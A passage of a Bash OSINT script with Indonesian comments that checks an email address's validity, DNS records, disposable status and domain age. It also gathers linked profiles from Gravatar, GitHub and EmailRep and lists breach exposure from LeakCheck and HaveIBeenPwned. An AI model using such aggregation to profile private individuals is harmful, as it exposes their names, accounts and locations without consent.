  total=$(jq -r '.total' <<< "$REPORT")
  if [ "$total" -eq 0 ]; then
    printf '  %sTidak ada hasil untuk "%s" (mode %s).%s\n' "$YEL" "$QUERY" "$SEARCH_MODE" "$R"
    [ "$SEARCH_MODE" != luas ] && printf '  %sCoba mode "luas" di menu Setting untuk hasil yang lebih longgar.%s\n' "$D" "$R"
    printf '\n'; quota_hit_note "$REPORT"; return
  fi
  found=$(jq -r '.found|length' <<< "$REPORT")
  failed=$(jq -r '.failed|length' <<< "$REPORT")
  secs=$(jq -r '(.tookMs/100|floor)/10' <<< "$REPORT")
  local rmode; rmode=$(jq -r '.mode // empty' <<< "$REPORT"); rmode=${rmode:-$SEARCH_MODE}
  printf '  %sDitemukan %s hasil di %s sumber%s  %s(mode %s, %s dtk)%s\n\n' "$GRN" "$total" "$found" "$R" "$D" "$rmode" "$secs" "$R"

  local width=$(( $(tput cols 2>/dev/null || echo 90) - 10 ))
  jq -r --argjson w "$width" --argjson max "$MAX_PER_SOURCE" \
        --arg B "$B" --arg D "$D" --arg C "$CYN" --arg R "$R" '
    def cut($n): gsub("\\s+";" ") | if length > $n then .[0:$n-1] + "…" else . end;
    def tag: if .rank == 3 then "persis" elif .rank == 2 then "semua kata" elif .rank == 1 then "sebagian" else "lemah" end;
    .found[] |
      "  \($C)●\($R) \($B)\(.source)\($R) \($D)· \(.category) · \(.items|length) hasil\($R)",
      (.items[:$max] | to_entries[] |
        "    \($D)\(.key+1).\($R) \(.value.title | cut($w - 14)) \($D)[\(.value | tag)]\($R)",
        "       \($C)\(.value.url)\($R)"),
      (if (.items|length) > $max
         then "    \($D)… +\((.items|length) - $max) lagi, lengkap di file hasil\($R)" else empty end),
      ""' <<< "$REPORT"
  [ "$failed" -gt 0 ] && printf '  %s%s sumber tidak bisa dijangkau saat ini.%s\n\n' "$D" "$failed" "$R"
  quota_hit_note "$REPORT"
}

slugify() {
  local s
  s=$(printf '%s' "$1" | LC_ALL=C.UTF-8 iconv -f UTF-8 -t ASCII//TRANSLIT 2>/dev/null | tr '[:upper:]' '[:lower:]' \
      | sed -e 's/[^a-z0-9]\{1,\}/-/g' -e 's/^-//' -e 's/-$//' | cut -c1-60)
  printf '%s' "${s:-tanpa-nama}"
}

save_report() { # mencetak path relatif file .md
  local dir="$BASE/hasil/$(slugify "$QUERY")" ts
  ts=$(date +%Y-%m-%d_%H-%M-%S)
  mkdir -p "$dir"
  printf '%s\n' "$REPORT" > "$dir/$ts.json"
  jq -r 'def tag: if .rank == 3 then "persis" elif .rank == 2 then "semua kata" elif .rank == 1 then "sebagian" else "lemah" end;
    "# Hasil pencarian: \(.query)\n\n\(.total) hasil di \(.found|length) sumber · mode \(.mode) · \(.date)\n",
    (.found[] | "\n## \(.source) · \(.category) (\(.items|length))\n",
      (.items[] | "- [\(.title)](\(.url))" + (if .date != "" then " · \(.date)" else "" end)
                  + " · cocok: \(tag)"
                  + (if .snippet != "" then "\n  \(.snippet)" else "" end)))' <<< "$REPORT" > "$dir/$ts.md"
  printf '%s' "${dir/#$PWD\//}/$ts.md"
}

# ======================================================================
# ---------- CARI EMAIL ----------
# Hanya memakai data yang terbuka untuk umum atau layanan verifikasi resmi.
# FINE-U tidak mengetes pemulihan kata sandi / pendaftaran di situs lain untuk
# menebak akun milik seseorang, dan tidak menampilkan isi kredensial bocor.
# ======================================================================
EMAIL_DIR="$BASE/hasil-email"
CACHE_DIR="$BASE/cache"

FREE_MAIL=" gmail.com googlemail.com yahoo.com yahoo.co.id yahoo.co.uk ymail.com rocketmail.com outlook.com outlook.co.id hotmail.com hotmail.co.uk live.com msn.com icloud.com me.com mac.com aol.com proton.me protonmail.com pm.me gmx.com gmx.net mail.com yandex.com yandex.ru mail.ru zoho.com tutanota.com tuta.io fastmail.com qq.com 163.com 126.com "
ROLE_LOCAL=" admin administrator info support sales contact kontak noreply no-reply donotreply postmaster webmaster hostmaster abuse hr billing help office hello marketing team cs customerservice finance humas redaksi security privacy legal press media mail email enquiry "
FALLBACK_DISPOSABLE=" mailinator.com guerrillamail.com guerrillamail.net 10minutemail.com tempmail.com temp-mail.org yopmail.com trashmail.com sharklasers.com getnada.com throwawaymail.com dispostable.com maildrop.cc fakeinbox.com mintemail.com mohmal.com emailondeck.com tempail.com burnermail.io tempmailo.com "

is_free_mail() { [[ $FREE_MAIL == *" $1 "* ]]; }

email_valid() { # $1 = alamat (sudah huruf kecil)
  local e=$1 l d lre='^[a-z0-9._%+-]+$' dre='^([a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,63}$'
  [[ $e == *@* ]] || return 1
  l=${e%@*}; d=${e##*@}
  (( ${#e} <= 254 && ${#l} >= 1 && ${#l} <= 64 )) || return 1
  [[ $l =~ $lre ]] || return 1
  [[ $l != .* && $l != *. && $l != *..* ]] || return 1
  [[ $d =~ $dre ]]
}

email_slug() {
  local s
  s=$(printf '%s' "$1" | tr 'A-Z' 'a-z' | sed -e 's/@/-at-/' -e 's/[^a-z0-9._+-]\{1,\}/-/g' -e 's/^[-.]*//' | cut -c1-80)
  printf '%s' "${s:-tanpa-email}"
}

reg_domain() { # domain terdaftar (tebakan sederhana: 2 label terakhir, 3 untuk co.id, ac.uk, dst.)
  local d=$1 n tld sld
  local -a p
  IFS=. read -ra p <<< "$d"; n=${#p[@]}
  (( n <= 2 )) && { printf '%s' "$d"; return; }
  tld=${p[n-1]}; sld=${p[n-2]}
  if (( ${#tld} == 2 )) && [[ " co com ac go or net web sch my biz mil org gov edu id " == *" $sld "* ]]; then
    printf '%s.%s.%s' "${p[n-3]}" "$sld" "$tld"
  else
    printf '%s.%s' "$sld" "$tld"
  fi
}

# ---------- pembantu modul ----------
# Setiap modul mencetak satu objek JSON:
#   {id,title,state,delta,summary,lines:[{k,v}],links:[{t,u}],facts:[{t,v}]}
# state: ok | warn | bad | info ; delta = pengaruh ke skor kepercayaan.
mod_json() { # id title state delta summary [lines] [links] [facts]
  jq -nc --arg id "$1" --arg t "$2" --arg s "$3" --argjson d "${4:-0}" --arg sum "${5:-}" \
     --argjson l "${6:-[]}" --argjson k "${7:-[]}" --argjson f "${8:-[]}" \
     '{id:$id, title:$t, state:$s, delta:$d, summary:$sum, lines:$l, links:$k, facts:$f}'
}
# Dipakai di dalam modul yang mendeklarasikan: local -a _L=() _K=() _F=()
addl() { _L+=("$(jq -nc --arg k "$1" --arg v "$2" '{k:$k, v:$v}')"); }
addk() { _K+=("$(jq -nc --arg t "$1" --arg u "$2" '{t:$t, u:$u}')"); }
addf() { _F+=("$(jq -nc --arg t "$1" --arg v "$2" '{t:$t, v:$v}')"); }
arr_json() { if [ "$#" -eq 0 ]; then echo '[]'; else printf '%s\n' "$@" | jq -sc .; fi; }
emit() { # id title state delta summary  (memakai _L _K _F milik pemanggil)
  mod_json "$1" "$2" "$3" "$4" "$5" "$(arr_json "${_L[@]}")" "$(arr_json "${_K[@]}")" "$(arr_json "${_F[@]}")"
}

# respons HTTP lengkap: mencetak "<isi>\n<kode>" (kode 404 dkk. tetap dikembalikan)
http_get() {
  local out
  out=$(curl -sS --compressed --max-time "$CURL_TIMEOUT" -A "$(get_random_ua)" -w '\n%{http_code}' "$@") || return 1
  printf '%s' "$out"
}

# ---------- 1. sintaks & alamat ----------
email_typo_fix() {
  case "$1" in
    gmial.com|gmai.com|gamil.com|gmail.co|gmil.com|gmaill.com|gmail.con|gnail.com|gmal.com|gmail.cm|gmail.om|gmaik.com|gimail.com) echo gmail.com ;;
    yahooo.com|yaho.com|yahou.com|yahoo.con|yahho.com|yhoo.com|yaoo.com) echo yahoo.com ;;
    hotnail.com|hotmial.com|hotmai.com|hotmail.con|hormail.com) echo hotmail.com ;;
    outlok.com|outloook.com|outlook.con|outllok.com) echo outlook.com ;;
    iclod.com|icloud.con|icoud.com) echo icloud.com ;;
    *) return 1 ;;
  esac
}

em_syntax() {
  local e=$1 l=${1%@*} d=${1##*@} base fix canon state=ok delta=5 sum="format valid" gl
  local -a _L=() _K=() _F=()
  addl "Alamat" "$e"
  addl "Panjang" "${#l} karakter nama + ${#d} karakter domain"
  base=${l%%+*}
  if [[ $l == *+* ]]; then
    addl "Alias (+tag)" "ya, tag \"${l#*+}\"; kotak masuk dasarnya ${base}@${d}"
    sum="$sum, memakai alias +tag"
  fi
  if [ "$d" = gmail.com ] || [ "$d" = googlemail.com ]; then
    gl=${base//./}; canon="${gl}@gmail.com"
    [ "$canon" != "$e" ] && addl "Bentuk kanonik Gmail" "$canon (titik dan +tag diabaikan Gmail)"
  fi
  if is_free_mail "$d"; then addl "Jenis domain" "penyedia email gratis / publik"
  else addl "Jenis domain" "domain sendiri (organisasi, bisnis, atau pribadi)"; fi
  if [[ $ROLE_LOCAL == *" $base "* ]]; then
    addl "Akun peran" "\"$base\" biasanya kotak masuk bersama, bukan milik satu orang"
    state=warn; delta=$((delta - 5)); sum="$sum, akun peran/umum"
  fi
  if fix=$(email_typo_fix "$d"); then
    addl "Kemungkinan salah ketik" "${l}@${fix}"
    state=warn; delta=$((delta - 10)); sum="$sum, mungkin salah ketik domain"
  fi
  local dre='[0-9]{5,}'
  if [[ $l =~ $dre ]]; then addl "Pola nama" "mengandung deret angka panjang (sering pada akun acak/massal)"; fi
  emit syntax "Sintaks & alamat" "$state" "$delta" "$sum"
}

# ---------- 2. DNS & server email ----------
doh() { # $1=nama $2=tipe
  fetch -H 'accept: application/dns-json' -G --data-urlencode "name=$1" --data-urlencode "type=$2" \
    "https://cloudflare-dns.com/dns-query"
}

mx_provider() { # $1 = host MX
  case "$1" in
    *google.com|*googlemail.com) echo "Google (Gmail / Workspace)" ;;
    *protection.outlook.com|*outlook.com|*hotmail.com) echo "Microsoft (Outlook / 365)" ;;
    *yahoodns.net|*yahoo.com) echo "Yahoo" ;;
    *zoho.com|*zoho.eu|*zoho.in) echo "Zoho Mail" ;;
    *protonmail.ch|*proton.me) echo "Proton Mail" ;;
    *icloud.com|*me.com) echo "Apple iCloud" ;;
    *messagingengine.com) echo "Fastmail" ;;
    *yandex.net|*yandex.ru) echo "Yandex" ;;
    *mimecast.com) echo "Mimecast (gateway keamanan)" ;;
    *pphosted.com|*ppe-hosted.com) echo "Proofpoint (gateway keamanan)" ;;
    *mailgun.org) echo "Mailgun" ;;
    *secureserver.net) echo "GoDaddy" ;;
    *titan.email) echo "Titan (Hostinger)" ;;
    *registrar-servers.com|*privateemail.com) echo "Namecheap" ;;
    *niagahoster*|*niaga*) echo "Niagahoster" ;;
    *rumahweb*) echo "Rumahweb" ;;
    *dewaweb*) echo "DewaWeb" ;;
    *idwebhost*) echo "IDwebhost" ;;
    *jagoanhosting*) echo "JagoanHosting" ;;
    *domainesia*) echo "DomaiNesia" ;;
    *biznetgio*|*biznet.id*) echo "Biznet Gio" ;;
    *qwords*) echo "Qwords" ;;
    *exabytes*) echo "Exabytes" ;;
    *hostinger*) echo "Hostinger" ;;
    *ovh.net) echo "OVH" ;;
    *qq.com) echo "Tencent QQ" ;;
    *) echo "" ;;
  esac
}

em_dns() {
  local e=$1 d=${1##*@} mxj st mxs a spf dm sel p tmpd dk=() line host prov state=ok delta=0 sum
  local -a _L=() _K=() _F=()
  mxj=$(doh "$d" MX) || return 1
  st=$(jq -r '.Status // 0' <<< "$mxj")
  if [ "$st" = 3 ]; then
    addl "Domain" "$d tidak ada (NXDOMAIN)"
    emit dns "DNS & server email" bad -60 "domain tidak ada"; return 0
  fi
  mxs=$(jq -r '[(.Answer // [])[] | select(.type == 15) | .data] | map(split(" ")) | map({p:(.[0]|tonumber? // 0), h:((.[1] // "")|sub("\\.$";"")|ascii_downcase)}) | sort_by(.p) | .[] | "\(.p) \(.h)"' <<< "$mxj")

  if [ -z "$mxs" ]; then
    a=$(doh "$d" A) || a='{}'
    if [ "$(jq '[(.Answer // [])[] | select(.type == 1)] | length' <<< "$a")" -gt 0 ]; then
      addl "MX" "tidak ada; hanya record A (server menerima lewat fallback, jarang dipakai untuk email sungguhan)"
      state=warn; delta=-15; sum="tanpa MX, hanya record A"
    else
      addl "MX" "tidak ada, dan domain tidak punya alamat server"
      emit dns "DNS & server email" bad -50 "domain tidak bisa menerima email"; return 0
    fi
  elif grep -qE '^0 $' <<< "$mxs"; then
    addl "MX" "null MX: domain secara tegas menyatakan tidak menerima email"
    emit dns "DNS & server email" bad -50 "domain menolak semua email (null MX)"; return 0
  else
    local list=() n=0
    while IFS= read -r line; do n=$((n + 1)); [ "$n" -le 4 ] && list+=("${line#* } (prio ${line%% *})"); done <<< "$mxs"
    addl "MX" "$(IFS=,; printf '%s' "${list[*]}" | sed 's/,/, /g')$([ "$n" -gt 4 ] && printf ' … +%d lagi' "$((n - 4))")"
    host=$(head -n1 <<< "$mxs"); host=${host#* }
    prov=$(mx_provider "$host")
    [ -n "$prov" ] && { addl "Penyedia email" "$prov"; addf penyedia "$prov"; }
    state=ok; delta=15; sum="MX aktif${prov:+, $prov}"
  fi

  # SPF
  spf=$(doh "$d" TXT) && spf=$(jq -r '[(.Answer // [])[] | select(.type == 16) | .data | gsub("\" \"";"") | gsub("\"";"") | select(startswith("v=spf1"))] | .[0] // ""' <<< "$spf") || spf=""
  if [ -n "$spf" ]; then
    case "$spf" in
      *" -all"*) addl "SPF" "ada, ketat (-all)"; delta=$((delta + 5)) ;;
      *" ~all"*) addl "SPF" "ada, sedang (~all)"; delta=$((delta + 3)) ;;
      *) addl "SPF" "ada, longgar (tanpa -all / ~all)"; delta=$((delta + 1)) ;;
    esac
  else addl "SPF" "tidak ada"; fi
  # DMARC
  dm=$(doh "_dmarc.$d" TXT) && dm=$(jq -r '[(.Answer // [])[] | select(.type == 16) | .data | gsub("\" \"";"") | gsub("\"";"") | select(startswith("v=DMARC1"))] | .[0] // ""' <<< "$dm") || dm=""
  if [ -n "$dm" ]; then
    p=$(sed -n 's/.*[; ]p=\([a-z]*\).*/\1/p' <<< " $dm")
    case "$p" in
      reject|quarantine) addl "DMARC" "ada, kebijakan $p (domain dikelola serius)"; delta=$((delta + 4)) ;;
      *) addl "DMARC" "ada, kebijakan ${p:-none} (hanya memantau)"; delta=$((delta + 1)) ;;
    esac
  else addl "DMARC" "tidak ada"; fi
  # DKIM: selector umum
  tmpd=$(mktemp -d)
  for sel in google selector1 selector2 default k1 dkim; do
    ( r=$(doh "$sel._domainkey.$d" TXT 2>/dev/null) \
        && [ "$(jq '[(.Answer // [])[] | select(.type == 16 or .type == 5)] | length' <<< "$r")" -gt 0 ] \
        && : > "$tmpd/$sel" ) &
  done
  wait
  for sel in google selector1 selector2 default k1 dkim; do [ -e "$tmpd/$sel" ] && dk+=("$sel"); done
  rm -rf "$tmpd"
  if [ "${#dk[@]}" -gt 0 ]; then addl "DKIM" "terdeteksi (selector: ${dk[*]})"; delta=$((delta + 2))
  else addl "DKIM" "tidak ditemukan pada selector umum (belum tentu tidak ada)"; fi
  emit dns "DNS & server email" "$state" "$delta" "$sum"
}

# ---------- 3. email sekali pakai ----------
disposable_list() { # pastikan cache daftar domain ada (diperbarui tiap 7 hari); cetak path
  local f="$CACHE_DIR/disposable-domains.txt"
  mkdir -p "$CACHE_DIR"
  if [ ! -s "$f" ] || [ -n "$(find "$f" -mtime +7 2>/dev/null)" ]; then
    fetch "https://raw.githubusercontent.com/disposable-email-domains/disposable-email-domains/main/disposable_email_blocklist.conf" 2>/dev/null \
      | tr -d '\r' | tr 'A-Z' 'a-z' | grep -E '^[a-z0-9.-]+$' > "$f.tmp"
    if [ -s "$f.tmp" ]; then mv "$f.tmp" "$f"; else rm -f "$f.tmp"; fi
  fi
  [ -s "$f" ] && printf '%s' "$f"
}

em_disposable() {
  local d=${1##*@} f x hit="" cnt=0 kb=""
  local -a _L=() _K=() _F=()
  if f=$(disposable_list); then
    cnt=$(wc -l < "$f")
    x=$d
    while [[ $x == *.* ]]; do
      grep -Fxq "$x" "$f" && { hit="$x"; break; }
      x=${x#*.}
    done
    addl "Daftar lokal" "$cnt domain sekali pakai (repo disposable-email-domains), $([ -n "$hit" ] && echo "COCOK: $hit" || echo "tidak cocok")"
  else
    [[ $FALLBACK_DISPOSABLE == *" $d "* ]] && hit=$d
    addl "Daftar lokal" "daftar unduhan tidak tersedia, memakai daftar bawaan kecil, $([ -n "$hit" ] && echo "COCOK" || echo "tidak cocok")"
  fi
  kb=$(fetch "https://open.kickbox.com/v1/disposable/$(urlenc "$d")" 2>/dev/null | jq -r 'if .disposable == true then "ya" elif .disposable == false then "tidak" else "" end' 2>/dev/null)
  [ -n "$kb" ] && addl "Kickbox (publik)" "sekali pakai: $kb"
  [ "$kb" = ya ] && [ -z "$hit" ] && hit=$d
  if [ -n "$hit" ]; then emit disposable "Email sekali pakai" bad -60 "domain sekali pakai / temp mail"
  else emit disposable "Email sekali pakai" ok 5 "bukan domain sekali pakai"; fi
}

# ---------- 4. registrasi domain (RDAP) ----------
em_rdap() {
  local d=${1##*@} rd r code body info reg exp registrar ns st age regts exp_d delta=0 state=info sum
  local -a _L=() _K=() _F=()
  if is_free_mail "$d"; then
    addl "Domain" "$d adalah penyedia email besar, umur domain tidak relevan"
    emit rdap "Registrasi domain" info 0 "penyedia email publik"; return 0
  fi
  rd=$(reg_domain "$d")
  r=$(http_get -L -H 'accept: application/rdap+json' "https://rdap.org/domain/$(urlenc "$rd")") || return 1
  code=${r##*$'\n'}; body=${r%$'\n'*}
  if [ "$code" != 200 ]; then
    addl "Domain" "$rd (data RDAP tidak tersedia, kode $code)"
    emit rdap "Registrasi domain" info 0 "data registrasi tidak tersedia"; return 0
  fi
  info=$(jq -c 'def ev($a): ((.events // []) | map(select(.eventAction == $a)) | .[0].eventDate // "");
    { reg: ev("registration"), exp: ev("expiration"), upd: ev("last changed"),
      registrar: ((.entities // []) | map(select((.roles // []) | index("registrar"))) | (.[0].vcardArray[1]? // []) | map(select(.[0] == "fn")) | (.[0][3]? // "")),
      ns: ((.nameservers // []) | map(.ldhName | ascii_downcase)), st: (.status // []) }' <<< "$body") || return 1
  reg=$(jq -r '.reg' <<< "$info"); exp=$(jq -r '.exp' <<< "$info")
  registrar=$(jq -r '.registrar' <<< "$info")
  addl "Domain terdaftar" "$rd"
  if [ -n "$reg" ] && regts=$(date -d "$reg" +%s 2>/dev/null) && age=$(( ($(date +%s) - regts) / 86400 )); then
    addl "Tanggal daftar" "${reg%%T*} (${age} hari / sekitar $((age / 365)) tahun $(( (age % 365) / 30 )) bulan lalu)"
    if [ "$age" -lt 30 ]; then state=bad; delta=-25; sum="domain baru sekali ($age hari)"
    elif [ "$age" -lt 180 ]; then state=warn; delta=-10; sum="domain masih muda ($age hari)"
    elif [ "$age" -ge 730 ]; then state=ok; delta=8; sum="domain mapan (>2 tahun)"
    else state=ok; delta=3; sum="domain berumur $((age / 30)) bulan"; fi
  else sum="tanggal daftar tidak diketahui"; fi
  if [ -n "$exp" ]; then
    addl "Kedaluwarsa" "${exp%%T*}"
    if exp_d=$(date -d "$exp" +%s 2>/dev/null) && [ $(( (exp_d - $(date +%s)) / 86400 )) -lt 30 ]; then
      addl "Catatan" "domain hampir kedaluwarsa (kurang dari 30 hari)"
    fi
  fi
  [ -n "$registrar" ] && addl "Registrar" "$registrar"
  ns=$(jq -r '.ns | .[:4] | join(", ")' <<< "$info"); [ -n "$ns" ] && addl "Nameserver" "$ns"
  st=$(jq -r '.st | join(", ")' <<< "$info"); [ -n "$st" ] && addl "Status" "$st"
  emit rdap "Registrasi domain" "$state" "$delta" "$sum"
}

# ---------- 5. jejak digital publik ----------
em_gravatar() {
  local e=$1 h r code body p nm usr loc about n
  local -a _L=() _K=() _F=()
  h=$(printf '%s' "$e" | md5sum | cut -d' ' -f1)
  r=$(http_get -L "https://en.gravatar.com/$h.json") || return 1
  code=${r##*$'\n'}; body=${r%$'\n'*}
  if [ "$code" = 200 ] && jq -e '.entry[0]' >/dev/null 2>&1 <<< "$body"; then
    p=$(jq -c '.entry[0] | {name:(.displayName // ""), user:(.preferredUsername // ""), about:(.aboutMe // ""),
        loc:(.currentLocation // ""), url:(.profileUrl // ""),
        accounts:[(.accounts // [])[] | {n:(.name // .shortname // "akun"), u:(.url // "")}],
        urls:[(.urls // [])[] | {t:(.title // ""), u:(.value // "")}]}' <<< "$body")
    nm=$(jq -r .name <<< "$p"); usr=$(jq -r .user <<< "$p"); loc=$(jq -r .loc <<< "$p"); about=$(jq -r '.about | gsub("\\s+";" ") | .[0:140]' <<< "$p")
    addl "Profil" "ada (dibuat dan dipublikasikan sendiri oleh pemilik email)"
    [ -n "$nm" ] && { addl "Nama tampilan" "$nm"; addf nama "$nm"; }
    [ -n "$usr" ] && { addl "Username" "$usr"; addf username "$usr"; }
    [ -n "$loc" ] && { addl "Lokasi (diisi sendiri)" "$loc"; addf lokasi "$loc"; }
    [ -n "$about" ] && addl "Tentang" "$about"
    while IFS=$'\t' read -r n u; do
      [ -z "$u" ] && continue
      addk "Gravatar › $n" "$u"; addf akun "$n: $u"
    done < <(jq -r '.accounts[] | [.n, .u] | @tsv' <<< "$p")
    while IFS=$'\t' read -r n u; do
      [ -z "$u" ] && continue
      addk "Situs${n:+ · $n}" "$u"
    done < <(jq -r '.urls[] | [.t, .u] | @tsv' <<< "$p")
    addk "Profil Gravatar" "$(jq -r '.url' <<< "$p")"
    emit gravatar "Gravatar" ok 8 "profil publik ditemukan${nm:+ ($nm)}"
  else
    code=$(curl -s -o /dev/null -w '%{http_code}' --max-time "$CURL_TIMEOUT" -A "$(get_random_ua)" "https://gravatar.com/avatar/$h?d=404" 2>/dev/null)
    if [ "$code" = 200 ]; then
      addl "Avatar" "ada foto Gravatar, tanpa profil publik"
      emit gravatar "Gravatar" info 4 "hanya foto avatar"
    else
      addl "Profil" "tidak ada Gravatar untuk email ini"
      emit gravatar "Gravatar" info 0 "tidak ada"
    fi
  fi
}

em_github() {
  local e=$1 u c logins names repos total
  local -a h=() _L=() _K=() _F=()
  [ -n "${GITHUB_TOKEN:-}" ] && h=(-H "Authorization: Bearer $GITHUB_TOKEN")
  u=$(fetch "${h[@]}" -G --data-urlencode "q=$e in:email" "https://api.github.com/search/users") || u=""
  c=$(fetch "${h[@]}" -H 'Accept: application/vnd.github+json' -G --data-urlencode "q=author-email:$e" \
        --data-urlencode "per_page=50" "https://api.github.com/search/commits") || c=""
  [ -z "$u" ] && [ -z "$c" ] && return 1
  [ -z "$u" ] && u='{}'; [ -z "$c" ] && c='{}'
  logins=$(jq -rn --argjson u "$u" --argjson c "$c" '
      ([($u.items // [])[] | .login] + [($c.items // [])[] | (.author.login // empty)])
      | group_by(.) | map({l:.[0], n:length}) | sort_by(-.n) | .[] | .l')
  names=$(jq -r '[(.items // [])[] | (.commit.author.name // empty)] | unique | .[:5] | join(", ")' <<< "$c")
  repos=$(jq -r '[(.items // [])[] | .repository.full_name] | unique | .[:5] | join(", ")' <<< "$c")
  total=$(jq -r '.total_count // 0' <<< "$c")
  if [ -z "$logins" ] && [ "$total" -eq 0 ]; then
    addl "Hasil" "tidak ada akun GitHub atau commit publik dengan email ini"
    emit github "GitHub" info 0 "tidak ditemukan"; return 0
  fi
  local l
  while IFS= read -r l; do
    [ -z "$l" ] && continue
    addl "Akun GitHub" "@$l"; addk "GitHub › @$l" "https://github.com/$l"
    addf username "$l"; addf akun "GitHub: https://github.com/$l"
  done <<< "$logins"
  [ "$total" -gt 0 ] && addl "Commit publik" "$total commit memakai email ini sebagai penulis"
  [ -n "$names" ] && { addl "Nama di commit" "$names"; while IFS= read -r l; do addf nama "$l"; done < <(tr ',' '\n' <<< "$names" | sed 's/^ *//'); }
  [ -n "$repos" ] && addl "Repositori" "$repos"
  emit github "GitHub" ok 10 "email terhubung ke aktivitas publik di GitHub"
}

em_pgp() {
  local e=$1 r code
  local -a _L=() _K=() _F=()
  r=$(http_get "https://keys.openpgp.org/vks/v1/by-email/$(urlenc "$e")") || return 1
  code=${r##*$'\n'}
  if [ "$code" = 200 ]; then
    addl "Kunci PGP" "ada kunci publik terverifikasi (pemilik pernah mengonfirmasi email ini)"
    addk "keys.openpgp.org" "https://keys.openpgp.org/search?q=$(urlenc "$e")"
    emit pgp "Kunci PGP" ok 3 "kunci publik terverifikasi"
  else
    addl "Kunci PGP" "tidak ada di keys.openpgp.org"
    emit pgp "Kunci PGP" info 0 "tidak ada"
  fi
}

em_emailrep() {
  local e=$1 j prof
  local -a h=() _L=() _K=() _F=()
  [ -n "${EMAILREP_API_KEY:-}" ] && h=(-H "Key: $EMAILREP_API_KEY")
  quota_take emailrep || return 1
  j=$(fetch "${h[@]}" "https://emailrep.io/$(urlenc "$e")") || return 1
  jq -e '.reputation' >/dev/null 2>&1 <<< "$j" || return 1
  local rep susp refs delta=0 state=ok flags=() fs ls
  rep=$(jq -r '.reputation' <<< "$j"); susp=$(jq -r '.suspicious' <<< "$j"); refs=$(jq -r '.references // 0' <<< "$j")
  addl "Reputasi" "$rep$([ "$susp" = true ] && echo ' (ditandai mencurigakan)')"
  addl "Jumlah referensi" "$refs sumber data yang pernah melihat email ini"
  fs=$(jq -r '.details.first_seen // empty' <<< "$j"); ls=$(jq -r '.details.last_seen // empty' <<< "$j")
  [ -n "$fs" ] && [ "$fs" != never ] && addl "Pertama terlihat" "$fs"
  [ -n "$ls" ] && [ "$ls" != never ] && addl "Terakhir terlihat" "$ls"
  prof=$(jq -r '(.details.profiles // []) | join(", ")' <<< "$j")
  if [ -n "$prof" ]; then
    addl "Terdaftar di" "$prof"
    local x; while IFS= read -r x; do [ -n "$x" ] && addf akun "Terdeteksi di $x"; done < <(jq -r '(.details.profiles // [])[]' <<< "$j")
  fi
  jq -e '.details.credentials_leaked == true' >/dev/null <<< "$j" && addl "Kredensial bocor" "ya (pernah muncul di kebocoran data)"
  jq -e '.details.malicious_activity == true' >/dev/null <<< "$j" && { addl "Aktivitas berbahaya" "ya"; flags+=(mal); }
  jq -e '.details.blacklisted == true' >/dev/null <<< "$j" && { addl "Daftar hitam" "ya"; flags+=(bl); }
  jq -e '.details.spam == true' >/dev/null <<< "$j" && { addl "Spam" "ya"; flags+=(spam); }
  case "$rep" in high) delta=$((delta + 10)) ;; medium) delta=$((delta + 5)) ;; low) delta=$((delta - 10)); state=warn ;; esac
  [ "$susp" = true ] && { delta=$((delta - 20)); state=bad; }
  [[ " ${flags[*]} " == *" mal "* ]] && { delta=$((delta - 30)); state=bad; }
  [[ " ${flags[*]} " == *" bl "* ]] && { delta=$((delta - 30)); state=bad; }
  [[ " ${flags[*]} " == *" spam "* ]] && { delta=$((delta - 10)); [ "$state" = ok ] && state=warn; }
  [ -n "$prof" ] && delta=$((delta + 5))
  emit emailrep "EmailRep" "$state" "$delta" "reputasi $rep, $refs referensi${prof:+, terlihat di $prof}"
}

# ---------- 6. kebocoran data (hanya nama kebocoran, tanpa isi kredensial) ----------
em_leakcheck() {
  local e=$1 j found fields src
  local -a _L=() _K=() _F=()
  j=$(fetch "https://leakcheck.io/api/public?check=$(urlenc "$e")") || return 1
  jq -e '.success == true' >/dev/null 2>&1 <<< "$j" || return 1
  found=$(jq -r '.found // 0' <<< "$j")
  if [ "$found" -eq 0 ]; then
    addl "Hasil" "tidak ditemukan di basis data LeakCheck"
    emit leakcheck "LeakCheck" ok 0 "tidak ada kebocoran tercatat"; return 0
  fi
  fields=$(jq -r '(.fields // []) | join(", ")' <<< "$j")
  src=$(jq -r '(.sources // []) | map(.name + (if (.date // "") != "" then " (" + .date + ")" else "" end)) | .[:10] | join(", ")' <<< "$j")
  addl "Muncul di" "$found kebocoran data"
  [ -n "$fields" ] && addl "Jenis data terpapar" "$fields"
  [ -n "$src" ] && addl "Sumber kebocoran" "$src"
  addl "Artinya" "alamat ini aktif/nyata sejak lama, tetapi juga pernah terekspos; pemilik sebaiknya mengganti kata sandi"
  emit leakcheck "LeakCheck" warn 4 "muncul di $found kebocoran data"
}

em_hibp() {
  local e=$1 r code body pr pcode pbody n
  local -a _L=() _K=() _F=()
  quota_take hibp || return 1
  r=$(http_get -H "hibp-api-key: $HIBP_API_KEY" "https://haveibeenpwned.com/api/v3/breachedaccount/$(urlenc "$e")?truncateResponse=false") || return 1
  code=${r##*$'\n'}; body=${r%$'\n'*}
  case "$code" in
    404) addl "Kebocoran" "tidak ditemukan di HaveIBeenPwned"; emit hibp "HaveIBeenPwned" ok 0 "tidak ada kebocoran tercatat"; return 0 ;;
    200) ;;
    *) return 1 ;;
  esac
  n=$(jq 'length' <<< "$body")
  addl "Muncul di" "$n kebocoran data"
  while IFS= read -r line; do addl "•" "$line"; done < <(jq -r 'sort_by(.BreachDate) | reverse | .[:8][]
      | "\(.Title) (\(.BreachDate // "?")): \((.DataClasses // []) | .[:6] | join(", "))"' <<< "$body")
  [ "$n" -gt 8 ] && addl "" "… +$((n - 8)) kebocoran lain"
  addl "Semua jenis data" "$(jq -r '[.[].DataClasses[]?] | unique | join(", ")' <<< "$body")"
  quota_take hibp && pr=$(http_get -H "hibp-api-key: $HIBP_API_KEY" "https://haveibeenpwned.com/api/v3/pasteaccount/$(urlenc "$e")") && {
    pcode=${pr##*$'\n'}; pbody=${pr%$'\n'*}
    [ "$pcode" = 200 ] && addl "Paste publik" "muncul di $(jq 'length' <<< "$pbody") paste (mis. Pastebin)"
  }
  addk "HaveIBeenPwned" "https://haveibeenpwned.com/account/$(urlenc "$e")"
  emit hibp "HaveIBeenPwned" warn 4 "muncul di $n kebocoran data"
}

# ---------- 7. layanan verifikasi berkunci ----------
em_hunter() {
  local e=$1 j st sc delta=0 state=ok nsrc
  local -a _L=() _K=() _F=()
  quota_take hunter || return 1
  j=$(fetch -G --data-urlencode "email=$e" --data-urlencode "api_key=$HUNTER_API_KEY" "https://api.hunter.io/v2/email-verifier") || return 1
